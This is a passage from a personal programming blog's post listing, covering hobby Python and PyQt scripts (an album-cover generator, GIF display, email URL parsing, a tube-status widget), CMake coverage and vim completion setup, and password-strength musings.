        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">tag</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;dt&quot;</span><span style="color: #f8f8f2">:</span>
            <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">attrs[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">][</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;class&#39;</span> <span style="color: #f92672">and</span> <span style="color: #f8f8f2">attrs[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">][</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;quote&#39;</span><span style="color: #f8f8f2">:</span>
                <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">True</span>

    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">handle_endtag</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">data):</span>
        <span style="color: #66d9ef">pass</span>

    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">handle_data</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">data):</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_data:</span>
            <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">quotes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(data)</span>
            <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">False</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">getAlbumTitle</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">random_quote_url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;http://www.quotationspage.com/random.php3&quot;</span>
    <span style="color: #f8f8f2">page</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">urllib</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlopen(random_quote_url)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">read()</span>
    <span style="color: #f8f8f2">parser</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">MyHTMLParser()</span>
    <span style="color: #f8f8f2">parser</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">feed(page)</span>

    <span style="color: #f8f8f2">num_quotes</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">len(parser</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">quotes)</span>
    <span style="color: #f8f8f2">quote</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">parser</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">quotes[random</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">randint(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">num_quotes)]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">rstrip(</span><span style="color: #e6db74">&#39;.&#39;</span><span style="color: #f8f8f2">)</span>

    <span style="color: #f8f8f2">last_set</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">random</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">randint(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">words</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">quote</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">split()</span>

    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">last_set</span> <span style="color: #f92672">&gt;</span> <span style="color: #f8f8f2">len(words):</span>
        <span style="color: #f8f8f2">last_set</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">len(words)</span>

    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot; &quot;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(words[</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">last_set:])</span>
</pre></div>
</p>

<p>The class here is used to parse the HTML from <a href="http://www.quotationspage.com/random.php3">http://www.quotationspage.com/random.php3</a>, specifically the tag that starts with <code>quote</code>. Once we have that we start capturing the data between that tag and store it in an array. Our <code>getAlbumTitle</code> function will use this data to select a random quote and then get the last 3 or 5 words from it and join them with spaces before returning that new string.</p>

<p>So now we have the data that we need, we just need to wrap it all up and generate our final image using <code>PIL</code>. Surprise, surprise, this isn&rsquo;t a big deal either.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">band_name</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getBandName()</span>
    <span style="color: #f8f8f2">album_title</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getAlbumTitle()</span>
    <span style="color: #f8f8f2">cover</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getAlbumImage()</span>

    <span style="color: #f92672">from</span> <span style="color: #f8f8f2">PIL</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">ImageFont</span>
    <span style="color: #f92672">from</span> <span style="color: #f8f8f2">PIL</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">Image</span>
    <span style="color: #f92672">from</span> <span style="color: #f8f8f2">PIL</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">ImageDraw</span>

    <span style="color: #f8f8f2">fnt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ImageFont</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">truetype(</span><span style="color: #e6db74">&quot;/usr/share/fonts/dejavu/DejaVuSans.ttf&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">25</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">lineWidth</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">20</span>
    <span style="color: #f8f8f2">image</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&quot;band.jpg&quot;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">imagebg</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new(</span><span style="color: #e6db74">&#39;RGBA&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size,</span> <span style="color: #e6db74">&quot;#000000&quot;</span><span style="color: #f8f8f2">)</span> <span style="color: #75715e"># make an entirely black image</span>
    <span style="color: #f8f8f2">mask</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new(</span><span style="color: #e6db74">&#39;L&#39;</span><span style="color: #f8f8f2">,image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size,</span><span style="color: #e6db74">&quot;#000000&quot;</span><span style="color: #f8f8f2">)</span>       <span style="color: #75715e"># make a mask that masks out all</span>
    <span style="color: #f8f8f2">draw</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ImageDraw</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Draw(image)</span>                     <span style="color: #75715e"># setup to draw on the main image</span>
    <span style="color: #f8f8f2">drawmask</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ImageDraw</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Draw(mask)</span>                <span style="color: #75715e"># setup to draw on the mask</span>
    <span style="color: #f8f8f2">drawmask</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">line((</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">lineWidth,</span> <span style="color: #f8f8f2">image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">],lineWidth),</span>
                  <span style="color: #f8f8f2">fill</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;#999999&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">width</span><span style="color: #f92672">=</span><span style="color: #ae81ff">100</span><span style="color: #f8f8f2">)</span>        <span style="color: #75715e"># draw a line on the mask to allow some bg through</span>
    <span style="color: #f8f8f2">image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">paste(imagebg,</span> <span style="color: #f8f8f2">mask</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">mask)</span>                    <span style="color: #75715e"># put the (somewhat) transparent bg on the main</span>
    <span style="color: #f8f8f2">draw</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text((</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">),</span> <span style="color: #f8f8f2">band_name,</span> <span style="color: #f8f8f2">font</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">fnt,</span> <span style="color: #f8f8f2">fill</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;#ffffff&quot;</span><span style="color: #f8f8f2">)</span>      <span style="color: #75715e"># add some text to the main</span>
    <span style="color: #f8f8f2">draw</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text((</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">40</span><span style="color: #f8f8f2">),</span> <span style="color: #f8f8f2">album_title,</span> <span style="color: #f8f8f2">font</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">fnt,</span> <span style="color: #f8f8f2">fill</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;#ffffff&quot;</span><span style="color: #f8f8f2">)</span>      <span style="color: #75715e"># add some text to the main</span>
    <span style="color: #66d9ef">del</span> <span style="color: #f8f8f2">draw</span>
    <span style="color: #f8f8f2">image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">save(</span><span style="color: #e6db74">&quot;out.jpg&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #e6db74">&quot;JPEG&quot;</span><span style="color: #f8f8f2">,quality</span><span style="color: #f92672">=</span><span style="color: #ae81ff">100</span><span style="color: #f8f8f2">)</span>
</pre></div>
</p>

<p>Let&rsquo;s go over what&rsquo;s happening here. You&rsquo;re welcome to clean it up as an exercise if you wish or think some values (like filenames) etc need configuring. Firstly we call the previously defined functions to fetch our album data and then we start the drawing. I use the <code>DejaVuSans.ttf</code> font for this example, but you can use any font you have, or even use different fonts for the title and band name, to make your cover look a bit more pleasing. Once the image we saved from Flickr is open, we start writing our title and band name on the album cover, and save out the result as a <code>JPEG</code>. The code here is commented so I won&rsquo;t go over the details here.</p>

<p>And that&rsquo;s all there is to it. If you want the the script as a whole file, you can <a href="https://gist.github.com/4025200">get it from this gist</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/11/02/animated-gifs-in-pyqt/">
        Show animated gifs using PyQT
      </a>
    </h1>

    <span class="post-date">Fri, Nov 2, 2012</span>

    <p>This is just a quick post to show you how to display animated gifs in PyQt. It&rsquo;s a straightforward process and by the end I will give you a class that wraps up the work for you.</p>

<p>The way we&rsquo;re going to approach this is by using a <code>QLabel</code> to render a <code>QMovie</code>. Assuming we have our gif (<code>anim.gif</code>) we need to load it into a <code>QMovie</code> and set it on the <code>QLabel</code>.</p>

<p>I&rsquo;ll give you the code now:</p>

<p>{% gist 4000025 %}</p>

<p>The code should be fairly easy to follow, so I won&rsquo;t spend much time here going over it. If you want to call this from a <code>__main__</code> function you simply do:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;__main__&quot;</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">gif</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;/path/to/image.gif&quot;</span>
    <span style="color: #f8f8f2">app</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">QApplication(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span>
    <span style="color: #f8f8f2">player</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ImagePlayer(gif)</span>
    <span style="color: #f8f8f2">player</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">show()</span>
    <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exit(app</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exec_())</span>
</pre></div>


  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/10/11/parsing-email-in-python/">
        Parsing email in python
      </a>
    </h1>

    <span class="post-date">Thu, Oct 11, 2012</span>

    <p>I have a domain where I host images. It&rsquo;s nothing fancy, just a collection where gifs and generally humerous images get stored in a custom gallery script.
I also have a script on my host that I can pass a URL to and it will get the image with wget, put it in the right directory and then curl the import URL for the gallery. So if you&rsquo;ve ever wanted to parse email addresses for content via a script, read on. Example code inside.</p>

<p>Now this in principle is great, but sometimes I need to add an image from my phone and the whole ssh thing becomes a bit cumbersome. Usually I&rsquo;ll see something in Reeder or some other iPhone app which allows me to email the URL. Perfect. So I wrote a quick script that would do the work for me, and set up an email address that passes any content to this script. The script in question is here:</p>

<p>{% gist 3872497 %}</p>

<p>I use the <code>fileinput</code> module to read the data from stdin and then join it all to a single text chunk. I&rsquo;m not expecting too much data in the email, so this isn&rsquo;t a big issue. Then I extract the message via the <code>email</code> module and parse the payload in order to get the actual email body, discarding the headers and all the other things I don&rsquo;t need. Assuming people have good etiquette and have the correct signature separator (<code>-- \n</code>), I also strip off the signature.
Once I have the body I extract the image URL(s) using regular expressions, and then pass the URL to my import script.</p>

<p>As you can see this only works with image URLs that are prefixed with <code>http://</code>. The email address is a random collection of letters and numbers to reduce the likelyhood of just anyone emailling links.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/08/13/cmake-and-gcov/">
        cmake and gcov
      </a>
    </h1>

    <span class="post-date">Mon, Aug 13, 2012</span>

    <p>Recently I setup a project that uses CMake as its build tool and <a href="https://code.google.com/p/googletest/">googletest</a> as a unit test framework. As is common place I wanted to make sure that my tests cover as much of the code as possible, so I went and grabbed the trusty gcov/lcov to analyse the tests only to find it wasn&rsquo;t as easy as I expected. I should mention this is the first time I have used CMake aswell as googletest. Granted, googletest is fairly simple and doesn&rsquo;t really complicate things when it comes to getting code coverage. I just had to figure out how we get CMake to build the test runner properly and then how to invoke lcov correctly. Turns out this was fairly easy too, once you ironed out some of the trickier bits and learned a little more about CMake.</p>

<p>In the <code>CMakeLists.txt</code> file for your test suite you need to add the following (I&rsquo;ve omitted some lines that aren&rsquo;t relevant to this article):</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">SET(</span><span style="color: #e6db74">PROJECT_TEST_NAME</span> <span style="color: #f92672">${</span><span style="color: #f8f8f2">PROJECT_NAME_STR</span><span style="color: #f92672">}</span><span style="color: #e6db74">_test</span><span style="color: #f8f8f2">)</span>
    
<span style="color: #f8f8f2">SET(</span><span style="color: #e6db74">CMAKE_CXX_FLAGS</span> <span style="color: #e6db74">&quot;-g -O0 -Wall -fprofile-arcs -ftest-coverage&quot;</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">SET(</span><span style="color: #e6db74">CMAKE_C_FLAGS</span> <span style="color: #e6db74">&quot;-g -O0 -Wall -W -fprofile-arcs -ftest-coverage&quot;</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">SET(</span><span style="color: #e6db74">CMAKE_EXE_LINKER_FLAGS</span> <span style="color: #e6db74">&quot;-fprofile-arcs -ftest-coverage&quot;</span><span style="color: #f8f8f2">)</span>

<span style="color: #960050; background-color: #1e0010">.</span>   
<span style="color: #960050; background-color: #1e0010">.</span>
<span style="color: #960050; background-color: #1e0010">.</span>

<span style="color: #f8f8f2">target_link_libraries(</span><span style="color: #f92672">${</span><span style="color: #f8f8f2">PROJECT_TEST_NAME</span><span style="color: #f92672">}</span> <span style="color: #e6db74">&quot;gtest_main&quot;</span> <span style="color: #e6db74">&quot;gtest&quot;</span> <span style="color: #e6db74">&quot;pthread&quot;</span><span style="color: #f8f8f2">)</span>
</pre></div>


<p>We need to make sure a debug build is on (<code>-g</code>), that we build without optimisation (<code>-O0</code>), and enable profiling (<code>-fprofile-arcs -ftest-coverage</code>). On the link phase we need to link against the google unit test libraries and pthread. Once you have sucessfully built your unit test you can then use lcov to generate the coverage results. Although you&rsquo;ll soon notice that it might not work. CMake places its files into different directories than you&rsquo;d expect from make or other build systems. So here&rsquo;s what I did to get this to work. Assuming you have a <code>tests</code> directory in your build, where your tests are and the test runner binary is built into, you have to run the following from that directory (<code>${PROJECTDIR}/build/tests</code>):</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$ </span>lcov --zerocounters --directory .
<span style="color: #f8f8f2">$ </span>lcov --capture --initial --directory . --output-file app

<span style="color: #75715e"># Now run your test app in the same directory</span>

<span style="color: #f8f8f2">$ </span>lcov --no-checksum --directory . --capture --output-file app.info
<span style="color: #f8f8f2">$ </span>genthml app.info
</pre></div>
</p>

<p>Now you can point your browser to that directory and you will have the nice html view of your coverage data.</p>

<p><em>Note</em>: sometimes I got an error from the second to last line saying it could not find any gcno files. In this case I just ran the test runner again and then ran the last two lines from above again.</p>

<p>Hope this helps you out in case you have the same issue as me.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/07/13/vim-clang/">
        vim clang autocompletion
      </a>
    </h1>

    <span class="post-date">Fri, Jul 13, 2012</span>

    <p>Code completion. Isn&rsquo;t it nice? Especially when you have a so many APIs that you can&rsquo;t always remember EVERY method, member or class name in it.</p>

<p>Vim. Isn&rsquo;t it powerful? The ease and speed with which it allows you to edit your code and do your work is just lovely.</p>

<p>But code completion in vim? Well yes. You can use ctags. Yes, you can make tag files for ALL your APIs and autocompletion works rather well. I did this and the Qt tags file is 1.7GB. So, urm yeah, that&rsquo;s not entirely awesome either. Plus it doesn&rsquo;t handle things like smart pointers, which you will no doubt come across at some stage.</p>

<p>So come on down <a href="https://github.com/Rip-Rip/clang_complete">clang_complete</a>. A little plugin for vim that uses <a href="http://clang.llvm.org/">clang</a> to resolve the necessary symbols. Plus it&rsquo;s reasonably easy to set up. All you need to do is follow the instructions that come with the plugin to install it. You will also need to install/build clang. For our purposes we will only need <code>libclang.so</code> as we will be using the library to do the completion instead of the binary - this is also the faster way. In order to use the library you need to add two things to your <code>.vimrc</code> file</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:clang_use_library <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:clang_library_path <span style="color: #f8f8f2">=</span> <span style="color: #e6db74">&quot;/path/to/libclang&quot;</span>
</pre></div>


<p>The <code>/path/to/libclang</code> is the path where libclang.so is located, not including the file name itself. Once you have set this up we should already see the autocomplete working when you start typing <code>.</code>, <code>-&gt;</code>, or <code>::</code> after a variable. But in order to specify the right paths to header files, we also need to make a <code>.clang_complete</code> file in our project&rsquo;s root directory. This includes the compiler&rsquo;s include flags like <code>-I/path/to/boost</code>. Luckily there&rsquo;s a handy tool that can generate this file from the current Makefile. It&rsquo;s located in <code>~/.vim/bin</code>. All you need to do is build your project by passing <code>CXX='~/.vim/bin/cc_args.py g++'</code> to the make command. For example:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #960050; background-color: #1e0010">make</span> <span style="color: #f8f8f2">CXX</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;~/.vim/bin/cc_args.py g++&#39;</span>
</pre></div>
</p>

<p>I should also mention that symbol resolution is scope dependant in case you see some weird completions. Enjoy.</p>

<p>EDIT 17/11/2012 The <code>.clang_include</code> file should actually be called <code>.clang_complete</code></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/06/07/tube-status/">
        Tube status for Conky
      </a>
    </h1>

    <span class="post-date">Thu, Jun 7, 2012</span>

    <p>Last night I was affected by &ldquo;severe delays on the Central line&rdquo; caused by a burst watermain and bringing part of the line to its knees. Unfortunately I only found this out once I got to the station. Usually the line is well behaved and I have little need to check it often. I know it&rsquo;s really quick to do so and there&rsquo;s a whole host of ways to dit too. But the problems I have with them are:</p>

<ol>
<li><strong>Check online</strong>: Have to remember to go online and check, which I often/always forget.</li>
<li><strong>iPhone app</strong>: Same again. Have to remember to actually do that each time I leave the office.</li>
<li><strong>Email alerts</strong>: I get a fair bit of email each day and end up just clicking <em>delete</em> or <em>mark as read</em> on stuff like that</li>
</ol>

<p>So here&rsquo;s what I&rsquo;ve come up with</p>

<p>A CLI app that checks the tube status for any number of given lines. &ldquo;Yeah, how does that help?&rdquo; I hear you ask. &ldquo;You still have to use it to check it&rdquo; you say. True. But there&rsquo;s another way to use it: Conky.</p>

<p>I use <a href="http://conky.sourceforge.net/">Conky</a> and I love it. So what better than to have the tube status for the relevant lines <strong>always</strong> on my desktop and updating every few seconds? So I quickly put together this python script to accomplish the task:</p>

<p>{% gist 2888187 %}</p>

<p>And it looks like this:</p>


<figure >
    
        <img src="center%20/images/content/conky.png" />
    
    
</figure>


<p>To add it to Conky just edit the <code>.conkyrc</code> file and add a line like so: <code>$alignr${execi 2 /path/to/tube.py central -s}</code> where <em>central</em> is the name(s)  of the line(s) (separate multiple lines with spaces) you want to get statuses for. The full list of lines is <a href="http://tubeupdates.com/documentation/">here</a>. The -s simply tells the script to supress the output of the full message and shows only the line name and short status.</p>

<p>It&rsquo;d be good to know if you find it useful or if you have any suggestions for it.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/06/06/sitting-is-bad/">
        Sitting is bad
      </a>
    </h1>

    <span class="post-date">Wed, Jun 6, 2012</span>

    <p>So the internet has recently been telling me that sitting is bad. Really bad. Well only if you <a href="http://www.msnbc.msn.com/id/34956099/ns/health-fitness/t/you-sitting-down-experts-say-itll-kill-you/">sit</a> <a href="http://mashable.com/2011/05/09/sitting-down-infographic/">for</a> <a href="http://lifehacker.com/5800720/the-sitting-is-killing-you-infographic-illustrates-the-stress-of-prolonged-sitting-importance-of-getting-up">long</a> <a href="http://www.sciencedaily.com/releases/2011/07/110712093859.htm">periods</a> of time. At my office it is very unlikely that they will be willing to furnish me with a standing desk unless my doctor tells them to. The latter also being unlikely as my back isn&rsquo;t in a bad enough shape (yet).</p>

<p>I&rsquo;m also not willing to <a href="http://gregschlom.com/post/4555981908/standing-desk">make my own</a> version of a standing desk either, unless it was a better looking one :) So now what? Fear not. It turns out that if you stand for about 5 minutes every hour it already helps <strong>A LOT</strong>. So that I don&rsquo;t miss my standing breaks, I need a timer. An unobtrusive little app that sits in my taskbar and just alerts me at intervals to take a break and have a stand. Far be it for me to actually go looking for something that does this just how I want it. That sounds like too much work really. Thus I decided to turn it into a project for myself and write my own. I mean, how hard can it be?</p>

<p>Turns out: not so hard at all. After about an hour of hacking around with some PyQt I made this: <a href="https://github.com/Svenito/EasyTimer">https://github.com/Svenito/EasyTimer</a></p>

<p>It runs in the system tray, lets you set a custom timer period and then it pops up a window once the time expires. Not tested to destruction or particularily pretty, but it does what it needs to do. I&rsquo;ll need to tweak some dialogs and add some little features, but if you want to do yourself a favour and take regular breaks, grab the timer and give it a go.</p>

<p>Right, time for a stand me thinks&hellip;.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/06/06/strong-passwords/">
        Strong passwords?
      </a>
    </h1>

    <span class="post-date">Wed, Jun 6, 2012</span>

    

<p>As I&rsquo;m just going around and updating the passwords to some of my online accounts, which was prompted by <a href="http://translate.google.com/translate?hl=en&amp;sl=no&amp;tl=en&amp;u=http://www.dagensit.no/article2411857.ece">this</a> article, I was wonderingwhat a good password really is. Not just in terms of security but also in terms of user friendliness.</p>

<p>I use <a href="http://www.lastpass.com">Lastpass</a> to manage my passwords and have it auto fill in my credentials on various sites. This works well until I need to manually enter them on another device (iPhone for example - I haven&rsquo;t got a premium subscription yet) or have to type it in just because.</p>

<p>We know that everywhere suggests some wonderfully random characters of at least 8 characters in length and Lastpass actually provides a tool to generate these:</p>

<ul>
<li>k%U94*7r</li>
<li>66ds}9R</li>
<li>9^wtH7xo</li>
</ul>

<p>Here we have some 8 character examples for apparently fairly secure options. Fine. They probably are secure. But do you really want to type those in using a touch keyboard on a phone?</p>

<p>Now here&rsquo;s my suggestion: <strong>Three or more random, unrelated words making one password.</strong>
For example:</p>

<ul>
<li>tarnishedmoleclouds</li>
<li>refriedchutneygarbage</li>
<li>turkeyloadedparasol</li>
</ul>

<p>Those of you who read <a href="http://xkcd.com/936/">XKCD</a> should already be on the same page as me. Not only are these more memorable (which if you use a password manager is irrelevant) but also much easier to type in on any type of keyboard. But that&rsquo;s not all. Let&rsquo;s have a look at bruteforce times using <a href="http://www.lockdown.co.uk/?pg=combi">these tables</a></p>

<p>In the first case we have 8 character passwords made up of &ldquo;Mixed upper and lower case alphabet and common symbols.&rdquo;. According to the relevant table (and we are assuming a reasonably competent team of crackers using a <a href="http://www.lockdown.co.uk/?pg=combi#classE">class E</a> attack) these passwords can be cracked in 346days. Not too bad really. But let&rsquo;s see how that compares to &ldquo;The full alphabet, either upper or lower case (not both in this case)&rdquo;. Picking one password from above (refriedchutneygarbage) with 21 characters it would take at least 6.3trillions years to break. Much better. Heck, even with 1000,000,000 guesses per second you&rsquo;re still looking at 631billion years.</p>

<p>I can&rsquo;t say how much of an impact adding/removing spaces has on the timings though - if any one knows, or has any insights, do share in the comments. Is using spaces better, the same, or worse than not using spaces? Theoretically I&rsquo;d imagine that it&rsquo;d be better with spaces as that&rsquo;s an extra character to add to the list.</p>

<h2 id="update:abb71b3d5285572362ebe516c3dc67ed">UPDATE</h2>

<p>Having said the above, it&rsquo;s worth also assuming that any competent cracker will be using wordlists too, and not just brute forcing the password. According to the <a href="http://oxforddictionaries.com/words/how-many-words-are-there-in-the-english-language">Oxford English Dictionary</a> there are about 140,000 words in use. This number is a bit high as most of us won&rsquo;t know, or use them all. So to get a more realistic number, I&rsquo;ve looked at some common wordlists you can find on the internet and the word count we&rsquo;re looking at is around 50,000 to 70,000.</p>

<p>Given that (as mentioned in the comments) we essentially have a 3 character password with a much larger search space, we can do the math. Three words, 60,000 (taking the middle word count) words will give us 216trillion possibilities. At a rate of 10,000,000 passwords per second it would take around 250 days to crack. Not too shabby still, but not as good as initially hoped, and also worse than your &lsquo;messy&rsquo; passwords.</p>

<p>So my solution to generating secure, but still easily typeable passwords, is to generate 15-20 character long passwords made only of random alphabetical characters rather than words. In this case the figures above will still hold true.</p>

<p>As a quick sampler of a generated password with 16 characters, lowercase only, and pronouncable:</p>

<ul>
<li>alicattervetonstou</li>
<li>molyciontivenzagol</li>
<li>audentophitendowdy</li>
</ul>

<p>harder to remember, harder to crack but still easily typed out even with an onscreen keyboard. The pronounceable part is optional but it might aid in remembering the password better.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2011/10/21/did-a-change-cross-a-threshold/">
        Did a change cross a threshold?
      </a>
    </h1>

    <span class="post-date">Fri, Oct 21, 2011</span>

    <p>So recently I needed to check if a change to a number caused it to cross a threshold. In this case, did the change cause a crossing of a threshold that is a multiple of 25? To try and make this a little easier to understand:</p>

<ul>
<li>True if the first value is 14 and the new value is 28. (crosses 25)</li>
<li>True if the first value is 43 and the new value is 58 . (crosses 50)</li>
</ul>

<p>You get the idea. So how do we best do it. With some thinking it&rsquo;s actually quite easy as you just base the decision off of the number of multiples each number is of 25:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">prev_multiple</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">t[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">/</span> <span style="color: #ae81ff">25</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">new_multiple</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">new_percentage</span> <span style="color: #f92672">/</span> <span style="color: #ae81ff">25</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(new_multiple</span> <span style="color: #f92672">&gt;</span> <span style="color: #f8f8f2">prev_multiple):</span>
    <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Crossed&quot;</span>
</pre></div>


<p>Nice and simple :)</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2011/05/27/shapely-window-in-pyqt/">
        Shapely Window in PyQT
      </a>
    </h1>

    <span class="post-date">Fri, May 27, 2011</span>

    <p>Recently I needed to make a PyQt app where the <strong>window</strong> is the shape of an image and doesn’t have a border. I say needed, that’s not strictly true, more like wanted to because it’d be more interesting.</p>

<p>It wasn’t as straight forward as I had hoped but I managed to get it working in the end and here I am about to share it with the world. Here’s what we will need:</p>

<ol>
<li>python, Qt, and PyQt installed<br /></li>
<li>The image you want to use as the background with transparency. PNG will do nicely<br /></li>
